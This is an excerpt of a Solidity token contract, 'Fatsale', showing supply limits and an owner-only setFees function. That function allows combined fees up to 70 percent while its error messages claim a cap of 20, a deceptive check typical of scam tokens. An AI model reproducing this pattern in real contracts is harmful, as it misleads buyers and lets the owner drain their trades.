...
contract Fatsale is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"貳仟零貳拾參";
    string private constant _symbol = unicode"iǎngqiānlíngèrshísān";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000 * 10**_decimals;
    uint256 public _maxTxAmount = 30 * 10**_decimals;
    uint256 public _maxWalletAmount = 30 * 10**_decimals;
    ...
    function setFees(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newLiquiditySellFee, uint256 newMarketingSellFee) external onlyOwner {
        require(newLiquidityBuyFee.add(newMarketingBuyFee) <= 70, "Buy fee can't go higher than 20");
        buyFee.liquidity = newLiquidityBuyFee;
        buyFee.marketing= newMarketingBuyFee;

        require(newLiquiditySellFee.add(newMarketingSellFee) <= 70, "Sell fee can't go higher than 20");
